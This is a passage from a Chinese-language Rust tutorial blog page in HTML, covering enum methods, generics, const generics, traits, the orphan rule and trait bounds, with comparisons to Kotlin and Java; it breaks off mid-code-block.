的简写。意思是我们传入了一个这个类型的实例的引用。这样在调用时便可以直接<code>circle.area()</code>。</p>\n<p>而没有传入自身引用的关联函数又是什么呢？我只说四个字——<strong>静态方法</strong>。</p>\n<h3 id=\"为枚举实现方法\"><a href=\"#为枚举实现方法\" class=\"headerlink\" title=\"为枚举实现方法\"></a>为枚举实现方法</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token attribute attr-name\">#![allow(unused)]</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Quit</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Move</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">call</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 在这里定义方法体</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tm<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"泛型-amp-特征-trait\"><a href=\"#泛型-amp-特征-trait\" class=\"headerlink\" title=\"泛型&amp;特征(trait)\"></a>泛型&amp;特征(trait)</h2><h3 id=\"声明一个基础的泛型\"><a href=\"#声明一个基础的泛型\" class=\"headerlink\" title=\"声明一个基础的泛型\"></a>声明一个基础的泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i8: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2i8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3i8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i32: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add f64: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当然可以看出来，这串代码是跑不了的，不是所有类型都允许相加的</p>\n<h3 id=\"使用trait约束泛型的类型\"><a href=\"#使用trait约束泛型的类型\" class=\"headerlink\" title=\"使用trait约束泛型的类型\"></a>使用trait约束泛型的类型</h3><p>那我们就尝试对他的类型进行约束</p>\n<p>这里语法比较类似kotlin</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>ops<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">Output</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">T</span><span class=\"token operator\">>></span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的<code>std::ops::Add&lt;Output = T&gt;</code>是不是比较类似于kotlin的接口？在rust中它叫做<code>trait </code>,特征。而实现了<code>std::ops::Add&lt;Output = T&gt;</code>,就支持了相加，泛型output就是相加后结果的类型。</p>\n<blockquote>\n<p>这些都说明一个道理，特征定义了<strong>一个可以被共享的行为，只要实现了特征，你就能使用该行为</strong>。</p>\n</blockquote>\n<h3 id=\"在枚举中使用泛型\"><a href=\"#在枚举中使用泛型\" class=\"headerlink\" title=\"在枚举中使用泛型\"></a>在枚举中使用泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Option</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">None</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"在方法中使用泛型\"><a href=\"#在方法中使用泛型\" class=\"headerlink\" title=\"在方法中使用泛型\"></a>在方法中使用泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">x</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p.x = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>这个例子中，<code>T,U</code> 是定义在结构体 <code>Point</code> 上的泛型参数，<code>V,W</code> 是单独定义在方法 <code>mixup</code> 上的泛型参数，它们并不冲突，说白了，你可以理解为，一个是结构体泛型，一个是函数泛型。</p>\n</blockquote>\n<h3 id=\"为具体的泛型类型实现方法\"><a href=\"#为具体的泛型类型实现方法\" class=\"headerlink\" title=\"为具体的泛型类型实现方法\"></a>为具体的泛型类型实现方法</h3><blockquote>\n<p>对于 <code>Point&lt;T&gt;</code> 类型，你不仅能定义基于 <code>T</code> 的方法，还能针对特定的具体类型，进行方法定义：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">f32</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">distance_from_origin</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f32</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这段代码意味着 <code>Point&lt;f32&gt;</code> 类型会有一个方法 <code>distance_from_origin</code>，而其他 <code>T</code> 不是 <code>f32</code> 类型的 <code>Point&lt;T&gt; </code>实例则没有定义此方法。这个方法计算点实例与坐标<code>(0.0, 0.0)</code> 之间的距离，并使用了只能用于浮点型的数学运算符。</p>\n<p>这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。</p>\n</blockquote>\n<h3 id=\"const-泛型\"><a href=\"#const-泛型\" class=\"headerlink\" title=\"const 泛型\"></a>const 泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先看看这段代码，如果我们想要约束传入切片的大小该怎么做呢</p>\n<p>const泛型其实就是针对常量值的泛型</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">usize</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">;</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们声明了一个常量泛型usize，这个usize可以放到入参处切片的类型中去，这便是常量泛型的用法。</p>\n<h3 id=\"泛型的性能\"><a href=\"#泛型的性能\" class=\"headerlink\" title=\"泛型的性能\"></a>泛型的性能</h3><blockquote>\n<p>在 Rust 中泛型是零成本的抽象，意味着你在使用泛型时，完全不用担心性能上的问题。</p>\n<p>但是任何选择都是权衡得失的，既然我们获得了性能上的巨大优势，那么又失去了什么呢？Rust 是在编译期为泛型对应的多个类型，生成各自的代码，因此损失了编译速度和增大了最终生成文件的大小。</p>\n<p>具体来说：</p>\n<p>Rust 通过在编译时进行泛型代码的 <strong>单态化</strong>(<em>monomorphization</em>)来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用代码转换为特定代码的过程。</p>\n<p>编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。</p>\n</blockquote>\n<h2 id=\"特征-trait\"><a href=\"#特征-trait\" class=\"headerlink\" title=\"特征(trait)\"></a>特征(trait)</h2><p>其实对应的就是java的interface，不过似乎设计得更好</p>\n<h3 id=\"定义特征\"><a href=\"#定义特征\" class=\"headerlink\" title=\"定义特征\"></a>定义特征</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// 允许有默认实现</span>\n    <span class=\"token comment\">// 默认实现中允许调用其他方法</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize1</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"巴拉巴拉\"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"为类型实现特征\"><a href=\"#为类型实现特征\" class=\"headerlink\" title=\"为类型实现特征\"></a>为类型实现特征</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Post</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">pub</span> title<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 标题</span>\n    <span class=\"token keyword\">pub</span> author<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 作者</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 内容</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Post</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"文章&#123;&#125;, 作者是&#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>author<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Weibo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">pub</span> username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Weibo</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;发表了微博&#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样的设计让Rust实现Kotlin那样的拓展函数成为可能。</p>\n<h3 id=\"孤儿原则\"><a href=\"#孤儿原则\" class=\"headerlink\" title=\"孤儿原则\"></a>孤儿原则</h3><blockquote>\n<p>上面我们将 <code>Summary</code> 定义成了 <code>pub</code> 公开的。这样，如果他人想要使用我们的 <code>Summary</code> 特征，则可以引入到他们的包中，然后再进行实现。</p>\n<p>关于特征实现与定义的位置，有一条非常重要的原则：<strong>如果你想要为类型 <code>A</code> 实现特征 <code>T</code>，那么 <code>A</code> 或者 <code>T</code> 至少有一个是在当前作用域中定义的！</strong>。例如我们可以为上面的 <code>Post</code> 类型实现标准库中的 <code>Display</code> 特征，这是因为 <code>Post</code> 类型定义在当前的作用域中。同时，我们也可以在当前包中为 <code>String</code> 类型实现 <code>Summary</code> 特征，因为 <code>Summary</code> 定义在当前作用域中。</p>\n<p>但是你无法在当前作用域中，为 <code>String</code> 类型实现 <code>Display</code> 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。</p>\n<p>该规则被称为<strong>孤儿规则</strong>，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码。</p>\n</blockquote>\n<h3 id=\"形参约束\"><a href=\"#形参约束\" class=\"headerlink\" title=\"形参约束\"></a>形参约束</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! &#123;&#125;\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 多重约束</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Display</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 不使用where约束</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token 